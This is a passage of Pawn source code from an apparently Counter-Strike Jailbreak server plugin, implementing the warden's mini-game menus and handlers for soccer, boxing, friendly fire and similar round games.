	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[6] \w%L^n", id, "JBE_MENU_MINI_GAME_RANDOM_SLOVO");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[7] \w%L %s^n", id, "JBE_MENU_MINI_GAME_OTTALKIV", g_bPush ? "\yВкл" : "\rВыкл");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[8] \w%L^n", id, "JBE_MENU_MINI_GAME_CHICKEN");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L", id, "JBE_MENU_NEXT");
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, (1<<0|1<<1|1<<2|1<<3|1<<4|1<<5|1<<6|1<<7|1<<8|1<<9), szMenu, -1, "Show_MiniGameMenu_1");
}

public Handle_MiniGameMenu_1(id, iKey)
{
	if(g_iDayMode != 1 || id != g_iChiefId || IsNotSetBit(g_iBitUserAlive, id)) return PLUGIN_HANDLED;
	switch(iKey)
	{
		case 0: return Show_SoccerMenu(id);
		case 1: return Show_BoxingMenu(id);
		case 2:
		{
			for(new i = 1; i <= g_iMaxPlayers; i++)
			{
				if(g_iUserTeam[i] != 1 || IsNotSetBit(g_iBitUserAlive, i)) continue;
				set_pdata_float(i, m_flNextDecalTime, 0.0);
			}
			UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ID_MINI_GAME_SPRAY");
		}
		case 3:
		{
			for(new i = 1; i <= g_iMaxPlayers; i++)
			{
				if(g_iUserTeam[i] != 1 || IsNotSetBit(g_iBitUserAlive, i) || IsSetBit(g_iBitUserSoccer, i) || IsSetBit(g_iBitUserBoxing, i) || IsSetBit(g_iBitUserDuel, i)) continue;
				ham_strip_weapon_name(i, "weapon_deagle");
				new iEntity = fm_give_item(i, "weapon_deagle");
				if(iEntity > 0) set_pdata_int(iEntity, m_iClip, -1, linux_diff_weapon);
			}
			UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ID_MINI_GAME_DISTANCE_DROP");
		}
		case 4:
		{
			if(g_iFriendlyFire)
			{
				g_iFriendlyFire = false;
				UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_MINI_GAME_FIRE_OFF");
				emit_sound(0, CHAN_AUTO, "jb_engine/zone_cntdwn_robo/0.wav", VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
			}
			else
			{
				g_iFriendlyFire = true;
				UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_MINI_GAME_FIRE_ON");
				emit_sound(0, CHAN_AUTO, "jb_engine/zone_cntdwn_robo/0.wav", VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
			}
		}
		case 5:
        {
            new randomword;
            randomword = random_num(1,30);
            
            switch(randomword)
                {
                        case 1:
                        {
							UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_SLOVO_1");
                            UTIL_SendAudio(0, _, g_szSounds[CHYKA_STOP]);
                        }
                        case 2:
                        {
                            UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_SLOVO_2");
                            UTIL_SendAudio(0, _, g_szSounds[CHYKA_STOP]);
                        }
                        case 3:
                        {
                            UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_SLOVO_3");
                            UTIL_SendAudio(0, _, g_szSounds[CHYKA_STOP]);
                        }
                        case 4:
                        {
                            UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_SLOVO_4");
                            UTIL_SendAudio(0, _, g_szSounds[CHYKA_STOP]);
                        }
                        case 5:
                        {
                            UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_SLOVO_5");
                            UTIL_SendAudio(0, _, g_szSounds[CHYKA_STOP]);
                        }
                        case 6:
                        {
                            UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_SLOVO_6");
                            UTIL_SendAudio(0, _, g_szSounds[CHYKA_STOP]);
                        }
                        case 7:
                        {
                            UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_SLOVO_7");
                            UTIL_SendAudio(0, _, g_szSounds[CHYKA_STOP]);
                        }
                        case 8:
                        {
                            UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_SLOVO_8");
                            UTIL_SendAudio(0, _, g_szSounds[CHYKA_STOP]);
                        }
                        case 9:
                        {
                            UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_SLOVO_9");
                            UTIL_SendAudio(0, _, g_szSounds[CHYKA_STOP]);
                        }
                        case 10:
                        {
                            UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_SLOVO_10");
                            UTIL_SendAudio(0, _, g_szSounds[CHYKA_STOP]);
                        }
                        case 11:
                        {
                            UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_SLOVO_11");
                            UTIL_SendAudio(0, _, g_szSounds[CHYKA_STOP]);
                        }
                        case 12:
                        {
                            UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_SLOVO_12");
                            UTIL_SendAudio(0, _, g_szSounds[CHYKA_STOP]);
                        }
                        case 13:
                        {
                            UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_SLOVO_13");
                            UTIL_SendAudio(0, _, g_szSounds[CHYKA_STOP]);
                        }
                        case 14:
                        {
                            UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_SLOVO_14");
                            UTIL_SendAudio(0, _, g_szSounds[CHYKA_STOP]);
                        }
                        case 15:
                        {
                            UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_SLOVO_15");
                            UTIL_SendAudio(0, _, g_szSounds[CHYKA_STOP]);
                        }
                        case 16:
                        {
                            UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_SLOVO_16");
                            UTIL_SendAudio(0, _, g_szSounds[CHYKA_STOP]);
                        }
                        case 17:
                        {
                            UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_SLOVO_17");
                            UTIL_SendAudio(0, _, g_szSounds[CHYKA_STOP]);
                        }
                        case 18:
                        {
                            UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_SLOVO_18");
                            UTIL_SendAudio(0, _, g_szSounds[CHYKA_STOP]);
                        }
                        case 19:
                        {
                            UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_SLOVO_19");
                            UTIL_SendAudio(0, _, g_szSounds[CHYKA_STOP]);
                        }
                        case 20:
                        {
                            UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_SLOVO_20");
                            UTIL_SendAudio(0, _, g_szSounds[CHYKA_STOP]);
                        }
                        case 21:
                        {
                            UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_SLOVO_21");
                            UTIL_SendAudio(0, _, g_szSounds[CHYKA_STOP]);
                        }
                        case 22:
                        {
                            UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_SLOVO_22");
                            UTIL_SendAudio(0, _, g_szSounds[CHYKA_STOP]);
                        }
                        case 23:
                        {
                            UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_SLOVO_23");
                            UTIL_SendAudio(0, _, g_szSounds[CHYKA_STOP]);
                        }
                        case 24:
                        {
                            UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_SLOVO_24");
                            UTIL_SendAudio(0, _, g_szSounds[CHYKA_STOP]);
                        }
                        case 25:
                        {
                            UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_SLOVO_25");
                            UTIL_SendAudio(0, _, g_szSounds[CHYKA_STOP]);
                        }
                        case 26:
                        {
                            UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_SLOVO_26");
                            UTIL_SendAudio(0, _, g_szSounds[CHYKA_STOP]);
                        }
                        case 27:
                        {
                            UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_SLOVO_27");
                            UTIL_SendAudio(0, _, g_szSounds[CHYKA_STOP]);
                        }
                        case 28:
                        {
                            UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_SLOVO_28");
                            UTIL_SendAudio(0, _, g_szSounds[CHYKA_STOP]);
                        }
                        case 29:
                        {
                            UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_SLOVO_29");
                            UTIL_SendAudio(0, _, g_szSounds[CHYKA_STOP]);
                        }
                        case 30:
                        {
                            UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_SLOVO_30");
                            UTIL_SendAudio(0, _, g_szSounds[CHYKA_STOP]);
                        }
                }
        }
		case 6:
		{
			if(g_bPush)
			{
				g_bPush = false;
				DisableHamForward(g_HamHookPlayerTouch);
				UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_MINI_GAME_OTTALKIV_OFF");
				emit_sound(0, CHAN_AUTO, "jb_engine/zone_cntdwn_robo/0.wav", VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
			}
			else
			{
				g_bPush = true;
				EnableHamForward(g_HamHookPlayerTouch);
				UTIL_SayText(0, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_MINI_GAME_OTTALKIV_ON");
				emit_sound(0, CHAN_AUTO, "jb_engine/zone_cntdwn_robo/0.wav", VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
			}
		}
		case 7: return Show_ChickenMenu(id);
		case 8: return Show_MiniGameMenu_2(id);
		case 9: return PLUGIN_HANDLED;
	}
	return Show_MiniGameMenu_1(id);
}

Show_MiniGameMenu_2(id)
{
	if(g_iDayMode != 1 || id != g_iChiefId || IsNotSetBit(g_iBitUserAlive, id)) return PLUGIN_HANDLED;
	new szMenu[512], iLen = formatex(szMenu, charsmax(szMenu), "\w%L^n^n", id, "JBE_MENU_MINI_GAME_TITLE");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \w%L^n", id, "JBE_MENU_MINI_GAME_SVETOFOR");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \w%L^n", id, "JBE_MENU_MINI_GAME_MAFIA");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L", id, "JBE_MENU_BACK");
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, (1<<0|1<<1|1<<8|1<<9), szMenu, -1, "Show_MiniGameMenu_2");
}

public Handle_MiniGameMenu_2(id, iKey)
{
	if(g_iDayMode != 1 || id != g_iChiefId || IsNotSetBit(g_iBitUserAlive, id)) return PLUGIN_HANDLED;
	switch(iKey)
	{
		case 0: return Show_SvetoforMenu(id);
		case 1: return Show_MafiaMenu(id);
		case 8: return Show_MiniGameMenu_1(id);
		case 9: return PLUGIN_HANDLED;
	}
	return Show_MiniGameMenu_2(id);
}

Show_SoccerMenu(id)
{
	if(g_iDayMode != 1 || id != g_iChiefId || IsNotSetBit(g_iBitUserAlive, id)) return PLUGIN_HANDLED;
	jbe_informer_offset_up(id);
	new szMenu[512], iKeys = (1<<0|1<<8|1<<9), iLen = formatex(szMenu, charsmax(szMenu), "\w%L^n^n", id, "JBE_MENU_SOCCER_TITLE");
	if(g_bSoccerStatus)
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \w%L^n", id, "JBE_MENU_SOCCER_DISABLE");
		if(g_iSoccerBall)
		{
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \w%L^n", id, "JBE_MENU_SOCCER_SUB_BALL");
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \w%L^n", id, "JBE_MENU_SOCCER_UPDATE_BALL");
			if(g_bSoccerGame)
			{
				iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[4] \w%L^n", id, "JBE_MENU_SOCCER_WHISTLE");
				iKeys |= (1<<3);
			}
			else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_SOCCER_WHISTLE");
			if(g_bSoccerGame) iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[5] \w%L^n", id, "JBE_MENU_SOCCER_GAME_END");
			else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[5] \w%L^n", id, "JBE_MENU_SOCCER_GAME_START");
			iKeys |= (1<<2|1<<4);
		}
		else
		{
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \w%L^n", id, "JBE_MENU_SOCCER_ADD_BALL");
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_SOCCER_UPDATE_BALL");
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_SOCCER_WHISTLE");
			if(g_bSoccerGame)
			{
				iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[5] \w%L^n", id, "JBE_MENU_SOCCER_GAME_END");
				iKeys |= (1<<4);
			}
			else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_SOCCER_GAME_START");
		}
		if(g_bSoccerGame)
		{
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_SOCCER_TEAMS");
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[7] \w%L^n^n", id, "JBE_MENU_SOCCER_SCORE");
			iKeys |= (1<<6);
		}
		else
		{
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[6] \w%L^n", id, "JBE_MENU_SOCCER_TEAMS");
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n^n", id, "JBE_MENU_SOCCER_SCORE");
			iKeys |= (1<<5);
		}
		iKeys |= (1<<1);
	}
	else
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \w%L^n", id, "JBE_MENU_SOCCER_ENABLE");
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_SOCCER_ADD_BALL");
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_SOCCER_UPDATE_BALL");
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_SOCCER_WHISTLE");
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_SOCCER_GAME_END");
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_SOCCER_TEAMS");
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n^n", id, "JBE_MENU_SOCCER_SCORE");
	}
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L", id, "JBE_MENU_BACK");
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_SoccerMenu");
}

public Handle_SoccerMenu(id, iKey)
{
	if(g_iDayMode != 1 || id != g_iChiefId || IsNotSetBit(g_iBitUserAlive, id)) return PLUGIN_HANDLED;
	switch(iKey)
	{
		case 0:
		{
			if(g_bSoccerStatus) jbe_soccer_disable_all();
			else g_bSoccerStatus = true;
		}
		case 1:
		{
			if(g_iSoccerBall) jbe_soccer_remove_ball();
			else jbe_soccer_create_ball(id);
		}
		case 2: if(g_iSoccerBall) jbe_soccer_update_ball();
		case 3:
		{
			if(g_bSoccerGame && g_iSoccerBall)
			{
				emit_sound(id, CHAN_AUTO, "jb_engine/soccer/whitle_start.wav", VOL_NORM, ATTN_NORM, 0, PITCH_NORM);
				g_bSoccerBallTouch = true;
			}
		}
		case 4:
		{
			if(g_bSoccerGame) jbe_soccer_game_end(id);
			else if(g_iSoccerBall) jbe_soccer_game_start(id);
		}
		case 5: if(!g_bSoccerGame) return Show_SoccerTeamMenu(id);
		case 6: if(g_bSoccerGame) return Show_SoccerScoreMenu(id);
		case 8: return Show_MiniGameMenu_1(id);
		case 9: return PLUGIN_HANDLED;
	}
	return Show_SoccerMenu(id);
}

Show_SoccerTeamMenu(id)
{
	if(g_bSoccerGame || g_iDayMode != 1 || id != g_iChiefId || IsNotSetBit(g_iBitUserAlive, id)) return PLUGIN_HANDLED;
	jbe_informer_offset_up(id);
	new szMenu[512], iLen = formatex(szMenu, charsmax(szMenu), "\w%L^n^n", id, "JBE_MENU_SOCCER_TEAM_TITLE");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \w%L^n", id, "JBE_MENU_SOCCER_TEAM_DIVIDE_PRISONERS");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \w%L^n", id, "JBE_MENU_SOCCER_TEAM_DIVIDE_ALL");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\d%L^n", id, "JBE_MENU_SOCCER_TEAM_DESCRIPTION");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[6] \w%L^n", id, "JBE_MENU_SOCCER_TEAM_ADD_RED");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[7] \w%L^n", id, "JBE_MENU_SOCCER_TEAM_ADD_BLUE");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[8] \w%L^n", id, "JBE_MENU_SOCCER_TEAM_SUB");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L", id, "JBE_MENU_BACK");
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, (1<<0|1<<1|1<<5|1<<6|1<<7|1<<8|1<<9), szMenu, -1, "Show_SoccerTeamMenu");
}

public Handle_SoccerTeamMenu(id, iKey)
{
	if(g_bSoccerGame || g_iDayMode != 1 || id != g_iChiefId || IsNotSetBit(g_iBitUserAlive, id)) return PLUGIN_HANDLED;
	switch(iKey)
	{
		case 0: jbe_soccer_divide_team(1);
		case 1: jbe_soccer_divide_team(0);
		case 7:
		{
			new iTarget, iBody;
			get_user_aiming(id, iTarget, iBody, 9999);
			if(jbe_is_user_valid(iTarget) && IsSetBit(g_iBitUserSoccer, iTarget))
			{
				ClearBit(g_iBitUserSoccer, iTarget);
				if(iTarget == g_iSoccerBallOwner)
				{
					CREATE_KILLPLAYERATTACHMENTS(iTarget);
					set_pev(g_iSoccerBall, pev_solid, SOLID_TRIGGER);
					set_pev(g_iSoccerBall, pev_velocity, {0.0, 0.0, 0.1});
					g_iSoccerBallOwner = 0;
				}
				if(IsSetBit(g_iBitClothingGuard, iTarget) && IsSetBit(g_iBitClothingType, iTarget)) jbe_set_user_model(iTarget, g_szPlayerModel[GUARD]);
				else jbe_default_player_model(iTarget);
				set_pdata_int(iTarget, m_bloodColor, 247);
				new iActiveItem = get_pdata_cbase(iTarget, m_pActiveItem);
				if(iActiveItem > 0)
				{
					ExecuteHamB(Ham_Item_Deploy, iActiveItem);
					UTIL_WeaponAnimation(iTarget, 3);
				}
			}
			else UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ID_PLAYERS_NOT_VALID");
			return Show_SoccerTeamMenu(id);
		}
		case 8: return Show_SoccerMenu(id);
		case 9: return PLUGIN_HANDLED;
		default:
		{
			new iTarget, iBody;
			get_user_aiming(id, iTarget, iBody, 9999);
			if(jbe_is_user_valid(iTarget) && IsSetBit(g_iBitUserAlive, iTarget) && IsNotSetBit(g_iBitUserDuel, iTarget) && (g_iUserTeam[iTarget] == 1 && IsNotSetBit(g_iBitUserFree, iTarget) && IsNotSetBit(g_iBitUserWanted, iTarget) && IsNotSetBit(g_iBitUserBoxing, iTarget) || g_iUserTeam[iTarget] == 2))
			{
				new szLangPlayer[][] = {"JBE_HUD_ID_YOU_TEAM_RED", "JBE_HUD_ID_YOU_TEAM_BLUE"};
				UTIL_SayText(iTarget, "%L %L", LANG_PLAYER, "JBE_PREFIX", iTarget, szLangPlayer[iKey - 5]);
				if(IsNotSetBit(g_iBitUserSoccer, iTarget))
				{
					SetBit(g_iBitUserSoccer, iTarget);
					jbe_set_user_model(iTarget, g_szPlayerModel[FOOTBALLER]);
					if(get_user_weapon(iTarget) != CSW_KNIFE) engclient_cmd(iTarget, "weapon_knife");
					else
					{
						new iActiveItem = get_pdata_cbase(iTarget, m_pActiveItem);
						if(iActiveItem > 0)
						{
							ExecuteHamB(Ham_Item_Deploy, iActiveItem);
							UTIL_WeaponAnimation(iTarget, 3);
						}
					}
					set_pdata_int(iTarget, m_bloodColor, -1);
					ClearBit(g_iBitClothingType, iTarget);
				}
				set_pev(iTarget, pev_skin, iKey - 5);
				g_iSoccerUserTeam[iTarget] = iKey - 5;
			}
			else UTIL_SayText(id, "%L %L", LANG_PLAYER, "JBE_PREFIX", LANG_PLAYER, "JBE_CHAT_ID_PLAYERS_NOT_VALID");
			return Show_SoccerTeamMenu(id);
		}
	}
	return Show_SoccerMenu(id);
}

Show_SoccerScoreMenu(id)
{
	if(!g_bSoccerGame || g_iDayMode != 1 || id != g_iChiefId || IsNotSetBit(g_iBitUserAlive, id)) return PLUGIN_HANDLED;
	jbe_informer_offset_up(id);
	new szMenu[512], iKeys = (1<<0|1<<2|1<<4|1<<8|1<<9), iLen = formatex(szMenu, charsmax(szMenu), "\w%L^n^n", id, "JBE_MENU_SOCCER_SCORE_TITLE");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \w%L^n", id, "JBE_MENU_SOCCER_SCORE_RED_ADD");
	if(g_iSoccerScore[0])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \w%L^n", id, "JBE_MENU_SOCCER_SCORE_RED_SUB");
		iKeys |= (1<<1);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_SOCCER_SCORE_RED_SUB");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \w%L^n", id, "JBE_MENU_SOCCER_SCORE_BLUE_ADD");
	if(g_iSoccerScore[1])
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[4] \w%L^n", id, "JBE_MENU_SOCCER_SCORE_BLUE_SUB");
		iKeys |= (1<<3);
	}
	else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_SOCCER_SCORE_BLUE_SUB");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[5] \w%L^n^n^n^n", id, "JBE_MENU_SOCCER_SCORE_RESET");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L", id, "JBE_MENU_BACK");
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_SoccerScoreMenu");
}

public Handle_SoccerScoreMenu(id, iKey)
{
	if(!g_bSoccerGame || g_iDayMode != 1 || id != g_iChiefId || IsNotSetBit(g_iBitUserAlive, id)) return PLUGIN_HANDLED;
	switch(iKey)
	{
		case 0: g_iSoccerScore[0]++;
		case 1: g_iSoccerScore[0]--;
		case 2: g_iSoccerScore[1]++;
		case 3: g_iSoccerScore[1]--;
		case 4: g_iSoccerScore = {0, 0};
		case 8: return Show_SoccerMenu(id);
		case 9: return PLUGIN_HANDLED;
	}
	return Show_SoccerScoreMenu(id);
}

Show_BoxingMenu(id)
{
	if(g_iDayMode != 1 || id != g_iChiefId || IsNotSetBit(g_iBitUserAlive, id)) return PLUGIN_HANDLED;
	jbe_informer_offset_up(id);
	new szMenu[512], iKeys = (1<<0|1<<8|1<<9), iLen = formatex(szMenu, charsmax(szMenu), "\w%L^n^n", id, "JBE_MENU_BOXING_TITLE");
	if(g_bBoxingStatus)
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \w%L^n", id, "JBE_MENU_BOXING_DISABLE");
		if(g_iBoxingGame == 2) iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_BOXING_GAME_START");
		else
		{
			if(g_iBoxingGame == 1) iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \w%L^n", id, "JBE_MENU_BOXING_GAME_END");
			else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[2] \w%L^n", id, "JBE_MENU_BOXING_GAME_START");
			iKeys |= (1<<1);
		}
		if(g_iBoxingGame == 1) iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_BOXING_GAME_TEAM_START");
		else
		{
			if(g_iBoxingGame == 2) iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \w%L^n", id, "JBE_MENU_BOXING_GAME_TEAM_END");
			else iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[3] \w%L^n", id, "JBE_MENU_BOXING_GAME_TEAM_START");
			iKeys |= (1<<2);
		}
		if(g_iBoxingGame) iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n^n", id, "JBE_MENU_BOXING_TEAMS");
		else
		{
			iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[4] \w%L^n^n", id, "JBE_MENU_BOXING_TEAMS");
			iKeys |= (1<<3);
		}
	}
	else
	{
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \w%L^n", id, "JBE_MENU_BOXING_ENABLE");
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_BOXING_GAME_START");
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n", id, "JBE_MENU_BOXING_GAME_TEAM_START");
		iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[#] \d%L^n^n", id, "JBE_MENU_BOXING_TEAMS");
	}
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[9] \w%L", id, "JBE_MENU_BACK");
	formatex(szMenu[iLen], charsmax(szMenu) - iLen, "^n\r[0] \w%L", id, "JBE_MENU_EXIT");
	return show_menu(id, iKeys, szMenu, -1, "Show_BoxingMenu");
}

public Handle_BoxingMenu(id, iKey)
{
	if(g_iDayMode != 1 || id != g_iChiefId || IsNotSetBit(g_iBitUserAlive, id)) return PLUGIN_HANDLED;
	switch(iKey)
	{
		case 0:
		{
			if(g_bBoxingStatus) jbe_boxing_disable_all();
			else
			{
				g_bBoxingStatus = true;
				g_iFakeMetaUpdateClientData = register_forward(FM_UpdateClientData, "FakeMeta_UpdateClientData_Post", 1);
			}
		}
		case 1:
		{
			if(g_iBoxingGame == 1) jbe_boxing_game_end();
			else jbe_boxing_game_start(id);
		}
		case 2:
		{
			if(g_iBoxingGame == 2) jbe_boxing_game_end();
			else jbe_boxing_game_team_start(id);
		}
		case 3: if(!g_iBoxingGame) return Show_BoxingTeamMenu(id);
		case 8: return Show_MiniGameMenu_1(id);
		case 9: return PLUGIN_HANDLED;
	}
	return Show_BoxingMenu(id);
}

Show_BoxingTeamMenu(id)
{
	if(g_iBoxingGame || g_iDayMode != 1 || id != g_iChiefId || IsNotSetBit(g_iBitUserAlive, id)) return PLUGIN_HANDLED;
	jbe_informer_offset_up(id);
	new szMenu[512], iLen = formatex(szMenu, charsmax(szMenu), "\w%L^n^n", id, "JBE_MENU_BOXING_TEAM_TITLE");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[1] \w%L^n", id, "JBE_MENU_BOXING_TEAM_DIVIDE");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\d%L^n", id, "JBE_MENU_BOXING_TEAM_DESCRIPTION");
	iLen += formatex(szMenu[iLen], charsmax(szMenu) - iLen, "\r[5] \w%L^n", id, "JBE_MENU_BOXING_TEAM_ADD_RED");
